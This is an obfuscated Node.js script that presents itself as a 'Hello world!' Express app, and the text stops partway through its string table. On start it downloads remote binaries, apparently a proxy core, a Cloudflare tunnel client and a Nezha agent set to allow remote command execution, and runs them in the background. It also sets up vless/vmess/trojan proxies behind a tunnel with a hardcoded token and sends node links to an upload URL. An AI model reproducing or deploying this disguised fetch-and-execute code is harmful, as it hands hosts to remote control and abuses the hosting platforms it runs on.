const _0x17b74b=_0x122a;(function(_0x15d94c,_0x2ffbdf){const _0x1fd2bd={_0x4f9fe2:0x1e1,_0x2ecc26:0x17f,_0x33990b:0x18e,_0x3e979c:0x201,_0xb146c:0x1dc,_0x144651:0x1f7},_0x1edb53=_0x122a,_0x37ee0d=_0x15d94c();while(!![]){try{const _0x27f42c=-parseInt(_0x1edb53(_0x1fd2bd._0x4f9fe2))/0x1+parseInt(_0x1edb53(0x1c9))/0x2*(-parseInt(_0x1edb53(0x146))/0x3)+-parseInt(_0x1edb53(0x1b7))/0x4*(parseInt(_0x1edb53(_0x1fd2bd._0x2ecc26))/0x5)+parseInt(_0x1edb53(_0x1fd2bd._0x33990b))/0x6*(parseInt(_0x1edb53(0x171))/0x7)+-parseInt(_0x1edb53(_0x1fd2bd._0x3e979c))/0x8+-parseInt(_0x1edb53(_0x1fd2bd._0xb146c))/0x9+parseInt(_0x1edb53(_0x1fd2bd._0x144651))/0xa;if(_0x27f42c===_0x2ffbdf)break;else _0x37ee0d['push'](_0x37ee0d['shift']());}catch(_0x3ae085){_0x37ee0d['push'](_0x37ee0d['shift']());}}}(_0x4c98,0x379e6));const express=require(_0x17b74b(0x167)),app=express(),axios=require(_0x17b74b(0x1ce)),os=require('os'),fs=require('fs'),path=require(_0x17b74b(0x1fa)),{promisify}=require(_0x17b74b(0x1bb)),exec=promisify(require(_0x17b74b(0x1d9))[_0x17b74b(0x16c)]),{execSync}=require(_0x17b74b(0x1d9)),UPLOAD_URL=process[_0x17b74b(0x1ba)][_0x17b74b(0x172)]||'',PROJECT_URL=process[_0x17b74b(0x1ba)][_0x17b74b(0x140)]||'',AUTO_ACCESS=process['env'][_0x17b74b(0x14d)]||![],FILE_PATH=process[_0x17b74b(0x1ba)]['FILE_PATH']||'./tmp',SUB_PATH=process['env'][_0x17b74b(0x16d)]||_0x17b74b(0x19b),PORT=process['env'][_0x17b74b(0x1a6)]||process['env'][_0x17b74b(0x1a1)]||0xbb8,UUID=process[_0x17b74b(0x1ba)][_0x17b74b(0x1f1)]||'699a4029-8024-4784-af5a-08d6c059889f',NEZHA_SERVER=process[_0x17b74b(0x1ba)][_0x17b74b(0x1a3)]||'',NEZHA_PORT=process[_0x17b74b(0x1ba)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x17b74b(0x1ba)][_0x17b74b(0x1d2)]||'',ARGO_DOMAIN=process['env'][_0x17b74b(0x142)]||_0x17b74b(0x141),ARGO_AUTH=process[_0x17b74b(0x1ba)][_0x17b74b(0x18f)]||'eyJhIjoiMjA3ZmVmNzA5MjkyMTkyNWZiNDVmNDRhYWVhMmViNmYiLCJ0IjoiOWExZWUwOWEtNjdkNC00OTc5LTliNzMtYjFmM2IyMTQ2YTljIiwicyI6Ik5qYzRaV0UzWWpFdFpqRTFOUzAwWldJMkxXRm1NekV0TWpJMk9XSXpNVEV6WXpobSJ9',ARGO_PORT=process[_0x17b74b(0x1ba)][_0x17b74b(0x1e8)]||0x1f41,CFIP=process['env'][_0x17b74b(0x1d8)]||_0x17b74b(0x161),CFPORT=process[_0x17b74b(0x1ba)][_0x17b74b(0x184)]||0x1bb,NAME=process[_0x17b74b(0x1ba)][_0x17b74b(0x1a0)]||_0x17b74b(0x1f3);!fs[_0x17b74b(0x1e5)](FILE_PATH)?(fs[_0x17b74b(0x182)](FILE_PATH),console[_0x17b74b(0x153)](FILE_PATH+'\x20is\x20created')):console[_0x17b74b(0x153)](FILE_PATH+_0x17b74b(0x1c6));function generateRandomName(){const _0x3fc32d={_0x3d0289:0x17b},_0x58ca8d=_0x17b74b,_0x2b8d3a=_0x58ca8d(0x1df);let _0x555126='';for(let _0x434772=0x0;_0x434772<0x6;_0x434772++){_0x555126+=_0x2b8d3a['charAt'](Math[_0x58ca8d(_0x3fc32d._0x3d0289)](Math[_0x58ca8d(0x1d4)]()*_0x2b8d3a[_0x58ca8d(0x19a)]));}return _0x555126;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x17b74b(0x1fc)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x17b74b(0x1fc)](FILE_PATH,_0x17b74b(0x15f)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x17b74b(0x1fc)](FILE_PATH,_0x17b74b(0x1aa)),configPath=path[_0x17b74b(0x1fc)](FILE_PATH,_0x17b74b(0x196));function _0x122a(_0x5582d2,_0x3be4aa){const _0x4c9819=_0x4c98();return _0x122a=function(_0x122af8,_0x16473a){_0x122af8=_0x122af8-0x13f;let _0x1b9f46=_0x4c9819[_0x122af8];return _0x1b9f46;},_0x122a(_0x5582d2,_0x3be4aa);}function deleteNodes(){const _0x34e45b={_0xbf8363:0x1e5,_0x3d18af:0x170,_0x1a875e:0x160,_0x278554:0x1f5,_0x3bc3c9:0x19a,_0x1bb79b:0x148,_0x20505e:0x18d,_0x41e7fd:0x1b9},_0x2cf6c5=_0x17b74b;try{if(!UPLOAD_URL)return;if(!fs[_0x2cf6c5(_0x34e45b._0xbf8363)](subPath))return;let _0x5c583e;try{_0x5c583e=fs[_0x2cf6c5(0x1b3)](subPath,_0x2cf6c5(_0x34e45b._0x3d18af));}catch{return null;}const _0x4eca73=Buffer['from'](_0x5c583e,_0x2cf6c5(_0x34e45b._0x1a875e))['toString']('utf-8'),_0x5ba820=_0x4eca73[_0x2cf6c5(_0x34e45b._0x278554)]('\x0a')[_0x2cf6c5(0x169)](_0x91b8a4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2cf6c5(0x1a5)](_0x91b8a4));if(_0x5ba820[_0x2cf6c5(_0x34e45b._0x3bc3c9)]===0x0)return;return axios[_0x2cf6c5(_0x34e45b._0x1bb79b)](UPLOAD_URL+_0x2cf6c5(0x1cb),JSON[_0x2cf6c5(_0x34e45b._0x20505e)]({'nodes':_0x5ba820}),{'headers':{'Content-Type':_0x2cf6c5(_0x34e45b._0x41e7fd)}})['catch'](_0x2eb3a5=>{return null;}),null;}catch(_0x7ace67){return null;}}function cleanupOldFiles(){const _0xf22651={_0x2f1169:0x17c,_0x2693aa:0x1c7},_0x5cb2b8={_0x494bd1:0x1cc},_0x527b6f=_0x17b74b;try{const _0x3c7d0f=fs[_0x527b6f(_0xf22651._0x2f1169)](FILE_PATH);_0x3c7d0f[_0x527b6f(_0xf22651._0x2693aa)](_0x453d8e=>{const _0x3bd101=_0x527b6f,_0xca144b=path['join'](FILE_PATH,_0x453d8e);try{const _0x2accb2=fs['statSync'](_0xca144b);_0x2accb2[_0x3bd101(_0x5cb2b8._0x494bd1)]()&&fs[_0x3bd101(0x188)](_0xca144b);}catch(_0x2dfdc3){}});}catch(_0x460d23){}}app[_0x17b74b(0x1c8)]('/',function(_0x546f6f,_0x498539){const _0x18bc4e={_0x224620:0x14f},_0x44e67e=_0x17b74b;_0x498539[_0x44e67e(0x1f0)](_0x44e67e(_0x18bc4e._0x224620));});async function generateConfig(){const _0x597bf8={_0x1c6ac2:0x1ef,_0x16d456:0x157,_0x3d4fc0:0x1d5,_0xa26492:0x183,_0x415699:0x150,_0x457c2c:0x1ab,_0x1e53c4:0x1c3,_0x57459a:0x19d,_0x30bdf7:0x186},_0x52c05c=_0x17b74b,_0x906a13={'log':{'access':_0x52c05c(_0x597bf8._0x1c6ac2),'error':_0x52c05c(_0x597bf8._0x1c6ac2),'loglevel':_0x52c05c(_0x597bf8._0x16d456)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x52c05c(_0x597bf8._0x16d456),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x52c05c(0x194),'dest':0xbbb},{'path':_0x52c05c(_0x597bf8._0x3d4fc0),'dest':0xbbc}]},'streamSettings':{'network':_0x52c05c(0x195)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x52c05c(_0x597bf8._0xa26492),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x52c05c(0x195),'security':'none'}},{'port':0xbba,'listen':_0x52c05c(0x19d),'protocol':_0x52c05c(0x183),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x52c05c(_0x597bf8._0x415699)}},'sniffing':{'enabled':!![],'destOverride':[_0x52c05c(_0x597bf8._0x457c2c),_0x52c05c(0x193),_0x52c05c(0x1c3)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x52c05c(0x19d),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x52c05c(0x194)}},'sniffing':{'enabled':!![],'destOverride':[_0x52c05c(0x1ab),_0x52c05c(0x193),_0x52c05c(_0x597bf8._0x1e53c4)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x52c05c(_0x597bf8._0x57459a),'protocol':_0x52c05c(0x1be),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x52c05c(0x1d5)}},'sniffing':{'enabled':!![],'destOverride':[_0x52c05c(0x1ab),_0x52c05c(0x193),_0x52c05c(0x1c3)],'metadataOnly':![]}}],'dns':{'servers':[_0x52c05c(0x19f)]},'outbounds':[{'protocol':_0x52c05c(_0x597bf8._0x30bdf7),'tag':_0x52c05c(0x15c)},{'protocol':_0x52c05c(0x15d),'tag':_0x52c05c(0x1bf)}]};fs['writeFileSync'](path[_0x52c05c(0x1fc)](FILE_PATH,'config.json'),JSON[_0x52c05c(0x18d)](_0x906a13,null,0x2));}function getSystemArchitecture(){const _0x150a06={_0x1b83cb:0x1f2,_0x13076a:0x1ad,_0x5b7c8f:0x16e,_0x302501:0x1e3},_0x2cb5b1=_0x17b74b,_0x1b5ff7=os[_0x2cb5b1(0x149)]();return _0x1b5ff7===_0x2cb5b1(_0x150a06._0x1b83cb)||_0x1b5ff7===_0x2cb5b1(_0x150a06._0x13076a)||_0x1b5ff7===_0x2cb5b1(_0x150a06._0x5b7c8f)?_0x2cb5b1(0x1f2):_0x2cb5b1(_0x150a06._0x302501);}function downloadFile(_0x3a93b3,_0x465b7e,_0x4dc90d){const _0x252d3e={_0x4479e4:0x182,_0x49ad28:0x13f},_0x3916e5={_0x2773ae:0x1fe,_0x553a54:0x189},_0x297ad6={_0x546f95:0x1f6},_0x159452=_0x17b74b,_0x418df8=_0x3a93b3;!fs['existsSync'](FILE_PATH)&&fs[_0x159452(_0x252d3e._0x4479e4)](FILE_PATH,{'recursive':!![]});const _0x21a143=fs[_0x159452(_0x252d3e._0x49ad28)](_0x418df8);axios({'method':_0x159452(0x1c8),'url':_0x465b7e,'responseType':'stream'})[_0x159452(0x1d3)](_0x5c85f1=>{const _0x36a9f1=_0x159452;_0x5c85f1[_0x36a9f1(_0x3916e5._0x2773ae)][_0x36a9f1(0x1ff)](_0x21a143),_0x21a143['on']('finish',()=>{const _0x23f720=_0x36a9f1;_0x21a143['close'](),console[_0x23f720(0x153)]('Download\x20'+path[_0x23f720(0x1d7)](_0x418df8)+'\x20successfully'),_0x4dc90d(null,_0x418df8);}),_0x21a143['on'](_0x36a9f1(_0x3916e5._0x553a54),_0x3c8066=>{const _0x452f5d=_0x36a9f1;fs['unlink'](_0x418df8,()=>{});const _0x3514f2=_0x452f5d(_0x297ad6._0x546f95)+path['basename'](_0x418df8)+_0x452f5d(0x1b2)+_0x3c8066['message'];console[_0x452f5d(0x189)](_0x3514f2),_0x4dc90d(_0x3514f2);});})[_0x159452(0x164)](_0x14b613=>{const _0x2595a1=_0x159452,_0x3617e3=_0x2595a1(0x1f6)+path[_0x2595a1(0x1d7)](_0x418df8)+'\x20failed:\x20'+_0x14b613[_0x2595a1(0x1b5)];console['error'](_0x3617e3),_0x4dc90d(_0x3617e3);});}async function downloadFilesAndRun(){const _0x550a71={_0x5bec97:0x19a,_0x1c5b5f:0x153,_0x5f0cf0:0x1bc,_0xe82dbf:0x1f5,_0x65285c:0x191,_0x3a34da:0x1e4,_0x30f08e:0x190,_0xc5fe94:0x1b8,_0x5096e2:0x200,_0x7e1d6:0x189,_0x176de4:0x1bd,_0x12c33b:0x1de,_0x1498e4:0x163,_0x5c45b9:0x1e0,_0x1784e6:0x1c1,_0x660a36:0x197,_0x4c3ecd:0x153,_0x45ea26:0x1a9,_0x97cfd0:0x1f4,_0x35a63d:0x17d,_0x4c9411:0x154,_0x25358c:0x1e5,_0xd6392a:0x1ed,_0x44b933:0x187,_0x173fcb:0x200,_0x2dd06f:0x189,_0x417823:0x1a8},_0x3fa57e={_0x473734:0x1c7},_0x2693ef={_0x51cedf:0x1e5,_0x3979bd:0x1e6},_0x832d62={_0x31b588:0x1d6,_0x4319e9:0x1fd},_0x1178bb=_0x17b74b,_0x8adeee=getSystemArchitecture(),_0x5d588e=getFilesForArchitecture(_0x8adeee);if(_0x5d588e[_0x1178bb(_0x550a71._0x5bec97)]===0x0){console[_0x1178bb(_0x550a71._0x1c5b5f)](_0x1178bb(0x1b4));return;}const _0xbf1436=_0x5d588e[_0x1178bb(0x174)](_0x58cacb=>{return new Promise((_0x13bbbf,_0x39ca09)=>{const _0x37c2fd=_0x122a;downloadFile(_0x58cacb[_0x37c2fd(_0x832d62._0x31b588)],_0x58cacb[_0x37c2fd(_0x832d62._0x4319e9)],(_0x2d5483,_0x3d53a1)=>{_0x2d5483?_0x39ca09(_0x2d5483):_0x13bbbf(_0x3d53a1);});});});try{await Promise['all'](_0xbf1436);}catch(_0x1e9b42){console['error'](_0x1178bb(_0x550a71._0x5f0cf0),_0x1e9b42);return;}function _0x2dfae6(_0x57cb52){const _0x3246dc=_0x1178bb,_0x2eeaec=0x1fd;_0x57cb52[_0x3246dc(_0x3fa57e._0x473734)](_0x44f1a0=>{const _0x527497={_0x45ad54:0x189,_0x198775:0x145,_0x3e3bb5:0x1c5},_0x4cd4c2=_0x3246dc;fs[_0x4cd4c2(_0x2693ef._0x51cedf)](_0x44f1a0)&&fs[_0x4cd4c2(_0x2693ef._0x3979bd)](_0x44f1a0,_0x2eeaec,_0x35df3b=>{const _0x4032c9=_0x4cd4c2;_0x35df3b?console[_0x4032c9(_0x527497._0x45ad54)](_0x4032c9(0x1a7)+_0x44f1a0+':\x20'+_0x35df3b):console['log'](_0x4032c9(_0x527497._0x198775)+_0x44f1a0+':\x20'+_0x2eeaec[_0x4032c9(_0x527497._0x3e3bb5)](0x8));});});}const _0x19331d=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2dfae6(_0x19331d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x354eed=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1178bb(_0x550a71._0xe82dbf)](':')['pop']():'',_0x17736a=new Set([_0x1178bb(0x18c),'8443',_0x1178bb(_0x550a71._0x65285c),_0x1178bb(_0x550a71._0x3a34da),_0x1178bb(0x1af),_0x1178bb(0x1de)]),_0x5ef864=_0x17736a['has'](_0x354eed)?'true':_0x1178bb(0x168),_0x3a19b7='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5ef864+_0x1178bb(0x14e)+UUID;fs[_0x1178bb(_0x550a71._0x30f08e)](path[_0x1178bb(0x1fc)](FILE_PATH,_0x1178bb(_0x550a71._0xc5fe94)),_0x3a19b7);const _0x366d2e='nohup\x20'+phpPath+_0x1178bb(0x17a)+FILE_PATH+_0x1178bb(0x159);try{await exec(_0x366d2e),console['log'](phpName+_0x1178bb(_0x550a71._0x5096e2)),await new Promise(_0x1ddbf1=>setTimeout(_0x1ddbf1,0x3e8));}catch(_0x34f9dd){console[_0x1178bb(_0x550a71._0x7e1d6)]('php\x20running\x20error:\x20'+_0x34f9dd);}}else{let _0x2c54a1='';const _0xce1b55=['443',_0x1178bb(_0x550a71._0x176de4),_0x1178bb(0x191),_0x1178bb(_0x550a71._0x3a34da),_0x1178bb(0x1af),_0x1178bb(_0x550a71._0x12c33b)];_0xce1b55[_0x1178bb(0x1f9)](NEZHA_PORT)&&(_0x2c54a1=_0x1178bb(_0x550a71._0x1498e4));const _0x1e9f44=_0x1178bb(0x1f4)+npmPath+_0x1178bb(_0x550a71._0x5c45b9)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1178bb(_0x550a71._0x1784e6)+NEZHA_KEY+'\x20'+_0x2c54a1+_0x1178bb(_0x550a71._0x660a36);try{await exec(_0x1e9f44),console[_0x1178bb(_0x550a71._0x4c3ecd)](npmName+_0x1178bb(0x200)),await new Promise(_0x2ff74c=>setTimeout(_0x2ff74c,0x3e8));}catch(_0x4569b1){console[_0x1178bb(_0x550a71._0x7e1d6)](_0x1178bb(0x1cd)+_0x4569b1);}}}else console[_0x1178bb(_0x550a71._0x4c3ecd)](_0x1178bb(_0x550a71._0x45ea26));const _0x4779bc=_0x1178bb(_0x550a71._0x97cfd0)+webPath+_0x1178bb(_0x550a71._0x35a63d)+FILE_PATH+_0x1178bb(0x1ec);try{await exec(_0x4779bc),console['log'](webName+_0x1178bb(_0x550a71._0x5096e2)),await new Promise(_0x251afb=>setTimeout(_0x251afb,0x3e8));}catch(_0x21757c){console[_0x1178bb(0x189)](_0x1178bb(_0x550a71._0x4c9411)+_0x21757c);}if(fs[_0x1178bb(_0x550a71._0x25358c)](botPath)){let _0x54b111;if(ARGO_AUTH[_0x1178bb(0x187)](/^[A-Z0-9a-z=]{120,250}$/))_0x54b111=_0x1178bb(_0x550a71._0xd6392a)+ARGO_AUTH;else ARGO_AUTH[_0x1178bb(_0x550a71._0x44b933)](/TunnelSecret/)?_0x54b111='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x54b111=_0x1178bb(0x147)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1178bb(0x1f4)+botPath+'\x20'+_0x54b111+_0x1178bb(0x16a)),console['log'](botName+_0x1178bb(_0x550a71._0x173fcb)),await new Promise(_0x2fa5f8=>setTimeout(_0x2fa5f8,0x7d0));}catch(_0xbccdc9){console[_0x1178bb(_0x550a71._0x2dd06f)](_0x1178bb(_0x550a71._0x417823)+_0xbccdc9);}}await new Promise(_0x324ded=>setTimeout(_0x324ded,0x1388));}function getFilesForArchitecture(_0x2098d8){const _0x5c1596={_0x1187ff:0x175,_0xb8eaba:0x1f2},_0x177c3e=_0x17b74b;let _0x4bbb25;_0x2098d8==='arm'?_0x4bbb25=[{'fileName':webPath,'fileUrl':_0x177c3e(0x1ae)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x4bbb25=[{'fileName':webPath,'fileUrl':_0x177c3e(0x1db)},{'fileName':botPath,'fileUrl':_0x177c3e(_0x5c1596._0x1187ff)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x43ef20=_0x2098d8===_0x177c3e(_0x5c1596._0xb8eaba)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x4bbb25['unshift']({'fileName':npmPath,'fileUrl':_0x43ef20});}else{const _0x8da4fc=_0x2098d8==='arm'?_0x177c3e(0x18a):_0x177c3e(0x192);_0x4bbb25[_0x177c3e(0x166)]({'fileName':phpPath,'fileUrl':_0x8da4fc});}}return _0x4bbb25;}function argoType(){const _0x2bcd35={_0x4d0326:0x153,_0x423a4d:0x202,_0xe8206c:0x16b,_0x199df2:0x180,_0x528052:0x156},_0x3fd6e4=_0x17b74b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3fd6e4(_0x2bcd35._0x4d0326)](_0x3fd6e4(_0x2bcd35._0x423a4d));return;}if(ARGO_AUTH['includes'](_0x3fd6e4(0x1e9))){fs['writeFileSync'](path['join'](FILE_PATH,_0x3fd6e4(0x14c)),ARGO_AUTH);const _0x4a6faa=_0x3fd6e4(_0x2bcd35._0xe8206c)+ARGO_AUTH[_0x3fd6e4(0x1f5)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,'tunnel.json')+_0x3fd6e4(0x185)+ARGO_DOMAIN+_0x3fd6e4(_0x2bcd35._0x199df2)+ARGO_PORT+_0x3fd6e4(0x1ee);fs[_0x3fd6e4(0x190)](path[_0x3fd6e4(0x1fc)](FILE_PATH,_0x3fd6e4(_0x2bcd35._0x528052)),_0x4a6faa);}else console[_0x3fd6e4(_0x2bcd35._0x4d0326)](_0x3fd6e4(0x165));}async function extractDomains(){const _0x12863b={_0x57c10a:0x15e,_0x1a8a8f:0x1f5,_0x5096a9:0x1c7,_0x12e8aa:0x1fb,_0x2c55cc:0x153,_0x281cbc:0x1aa,_0x2e26e6:0x153,_0x259cb7:0x200,_0x500706:0x1a8},_0x551524={_0x55c4ce:0x1c8,_0x203916:0x152,_0x25b599:0x1fe,_0x57ab6e:0x151,_0x41bd03:0x1fe,_0x4e8e04:0x19e,_0x5bd0f2:0x14a},_0x548fea={_0x4f8a52:0x15a,_0x27ab11:0x1e2,_0x31a06a:0x18b},_0x7b1a12=_0x17b74b;let _0x2319ce;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2319ce=ARGO_DOMAIN,console[_0x7b1a12(0x153)](_0x7b1a12(_0x12863b._0x57c10a),_0x2319ce),await _0x58f9e0(_0x2319ce);else try{const _0x3887d1=fs['readFileSync'](path[_0x7b1a12(0x1fc)](FILE_PATH,'boot.log'),_0x7b1a12(0x170)),_0x10bfa8=_0x3887d1[_0x7b1a12(_0x12863b._0x1a8a8f)]('\x0a'),_0x18ce9c=[];_0x10bfa8[_0x7b1a12(_0x12863b._0x5096a9)](_0x62cd1=>{const _0x28a99e=_0x7b1a12,_0x1ea525=_0x62cd1[_0x28a99e(0x187)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1ea525){const _0x5cbbf9=_0x1ea525[0x1];_0x18ce9c[_0x28a99e(0x1dd)](_0x5cbbf9);}});if(_0x18ce9c[_0x7b1a12(0x19a)]>0x0)_0x2319ce=_0x18ce9c[0x0],console[_0x7b1a12(0x153)](_0x7b1a12(_0x12863b._0x12e8aa),_0x2319ce),await _0x58f9e0(_0x2319ce);else{console[_0x7b1a12(_0x12863b._0x2c55cc)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x7b1a12(0x1fc)](FILE_PATH,_0x7b1a12(_0x12863b._0x281cbc)));async function _0x7096a3(){const _0x1da729=_0x7b1a12;try{process['platform']===_0x1da729(_0x548fea._0x4f8a52)?await exec(_0x1da729(0x173)+botName+_0x1da729(_0x548fea._0x27ab11)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x1da729(0x1c0)](0x1)+_0x1da729(_0x548fea._0x31a06a));}catch(_0x24be68){}}_0x7096a3(),await new Promise(_0x200cb1=>setTimeout(_0x200cb1,0xbb8));const _0x316618=_0x7b1a12(0x147)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x316618+_0x7b1a12(0x16a)),console[_0x7b1a12(_0x12863b._0x2e26e6)](botName+_0x7b1a12(_0x12863b._0x259cb7)),await new Promise(_0x389c38=>setTimeout(_0x389c38,0xbb8)),await extractDomains();}catch(_0x5bbb3f){console['error'](_0x7b1a12(_0x12863b._0x500706)+_0x5bbb3f);}}}catch(_0x5de572){console[_0x7b1a12(0x189)](_0x7b1a12(0x1f8),_0x5de572);}async function _0x7fe596(){const _0x1f7fd7=_0x7b1a12;try{const _0x567e14=await axios[_0x1f7fd7(_0x551524._0x55c4ce)](_0x1f7fd7(_0x551524._0x203916),{'timeout':0xbb8});if(_0x567e14['data']&&_0x567e14['data']['country_code']&&_0x567e14[_0x1f7fd7(0x1fe)][_0x1f7fd7(0x19e)])return _0x567e14[_0x1f7fd7(_0x551524._0x25b599)][_0x1f7fd7(0x198)]+'_'+_0x567e14['data'][_0x1f7fd7(0x19e)];}catch(_0x4afe45){try{const _0x59401e=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x59401e[_0x1f7fd7(0x1fe)]&&_0x59401e[_0x1f7fd7(_0x551524._0x25b599)][_0x1f7fd7(0x17e)]===_0x1f7fd7(0x15b)&&_0x59401e[_0x1f7fd7(_0x551524._0x25b599)][_0x1f7fd7(_0x551524._0x57ab6e)]&&_0x59401e[_0x1f7fd7(_0x551524._0x41bd03)][_0x1f7fd7(_0x551524._0x4e8e04)])return _0x59401e[_0x1f7fd7(_0x551524._0x25b599)][_0x1f7fd7(_0x551524._0x57ab6e)]+'_'+_0x59401e['data'][_0x1f7fd7(_0x551524._0x4e8e04)];}catch(_0x2af505){}}return _0x1f7fd7(_0x551524._0x5bd0f2);}async function _0x58f9e0(_0xc1891){const _0x11a74a={_0x5461c7:0x157,_0x2960ff:0x1b1,_0x20734a:0x18d,_0x1a4385:0x1c5,_0x3117b4:0x1eb,_0x4a1ca7:0x181,_0x40690d:0x1ac,_0x30fae7:0x144,_0x5a2a83:0x190,_0x599e20:0x153,_0x579ada:0x1c8},_0x982da2=await _0x7fe596(),_0x4dd44b=NAME?NAME+'-'+_0x982da2:_0x982da2;return new Promise(_0x5599d6=>{const _0x267b2e={_0x115f5a:0x179};setTimeout(()=>{const _0x59c7a0=_0x122a,_0x3f4e00={'v':'2','ps':''+_0x4dd44b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x59c7a0(_0x11a74a._0x5461c7),'host':_0xc1891,'path':_0x59c7a0(0x1ea),'tls':_0x59c7a0(0x193),'sni':_0xc1891,'alpn':'','fp':_0x59c7a0(0x143)},_0xff73cf=_0x59c7a0(0x14b)+UUID+'@'+CFIP+':'+CFPORT+_0x59c7a0(0x1c2)+_0xc1891+_0x59c7a0(0x1eb)+_0xc1891+_0x59c7a0(_0x11a74a._0x2960ff)+_0x4dd44b+'\x0a\x0avmess://'+Buffer[_0x59c7a0(0x144)](JSON[_0x59c7a0(_0x11a74a._0x20734a)](_0x3f4e00))[_0x59c7a0(_0x11a74a._0x1a4385)](_0x59c7a0(0x160))+_0x59c7a0(0x1a2)+UUID+'@'+CFIP+':'+CFPORT+_0x59c7a0(0x199)+_0xc1891+_0x59c7a0(_0x11a74a._0x3117b4)+_0xc1891+_0x59c7a0(_0x11a74a._0x4a1ca7)+_0x4dd44b+_0x59c7a0(_0x11a74a._0x40690d);console['log'](Buffer[_0x59c7a0(_0x11a74a._0x30fae7)](_0xff73cf)[_0x59c7a0(_0x11a74a._0x1a4385)](_0x59c7a0(0x160))),fs[_0x59c7a0(_0x11a74a._0x5a2a83)](subPath,Buffer[_0x59c7a0(0x144)](_0xff73cf)['toString']('base64')),console[_0x59c7a0(_0x11a74a._0x599e20)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x59c7a0(_0x11a74a._0x579ada)]('/'+SUB_PATH,(_0x53d176,_0xbb72ad)=>{const _0xec343e=_0x59c7a0,_0x2fda70=Buffer['from'](_0xff73cf)['toString'](_0xec343e(0x160));_0xbb72ad[_0xec343e(0x155)](_0xec343e(_0x267b2e._0x115f5a),_0xec343e(0x19c)),_0xbb72ad['send'](_0x2fda70);}),_0x5599d6(_0xff73cf);},0x7d0);});}}function _0x4c98(){const _0x5a94ea=['ARGO_PORT','TunnelSecret','/vmess-argo?ed=2560','&fp=firefox&type=ws&host=','/config.json\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/dev/null','send','UUID','arm','railway-','nohup\x20','split','Download\x20','7263910reOnKo','Error\x20reading\x20boot.log:','includes','path','ArgoDomain:','join','fileUrl','data','pipe','\x20is\x20running','357016SgzXaL','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','createWriteStream','PROJECT_URL','railway.xfwwl.pp.ua','ARGO_DOMAIN','firefox','from','Empowerment\x20success\x20for\x20','321UMNHJP','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','post','arch','Unknown','\x0avless://','tunnel.json','AUTO_ACCESS','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Hello\x20world!','/vless-argo','countryCode','https://ipapi.co/json/','log','web\x20running\x20error:\x20','set','tunnel.yml','none','/api/add-subscriptions','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','win32','success','direct','blackhole','ARGO_DOMAIN:','sub.txt','base64','cdns.doon.eu.org','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','--tls','catch','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x